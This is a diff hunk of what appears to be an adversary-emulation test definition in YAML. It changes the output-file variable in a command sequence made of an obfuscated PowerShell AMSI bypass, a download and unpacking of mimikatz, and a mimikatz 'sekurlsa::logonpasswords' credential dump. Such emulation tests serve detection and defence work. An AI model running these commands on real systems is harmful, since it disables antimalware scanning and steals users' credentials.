@@ -176,7 +176,7 @@ atomic_tests:
       powershell -Command "sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( '{1}{0}'-F'F','rE' ) ) ; ( GeT-VariaBle ( '1Q2U' +'zX' ) -VaL ).'A`ss`Embly'.'GET`TY`Pe'(( '{6}{3}{1}{4}{2}{0}{5}' -f'Util','A','Amsi','.Management.','utomation.','s','System' ) ).'g`etf`iElD'( ( '{0}{2}{1}' -f'amsi','d','InitFaile' ),( '{2}{4}{0}{1}{3}' -f 'Stat','i','NonPubli','c,' )).'sE`T`VaLUE'( ${n`ULl},${t`RuE} )"
       powershell "Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip' -OutFile 'C:\temp\mimikatz.zip'"
       powershell "Expand-Archive -Path 'C:\temp\mimikatz.zip' -DestinationPath 'C:\temp'"
-      ${MimikatzExecutable} "privilege::debug" "sekurlsa::logonpasswords" "exit" > #{OutputFile}
+      ${MimikatzExecutable} "privilege::debug" "sekurlsa::logonpasswords" "exit" > ${OutputFile}
   prerequisites:
     - Administrator privileges on the Windows system.
     - Internet access to download Mimikatz.
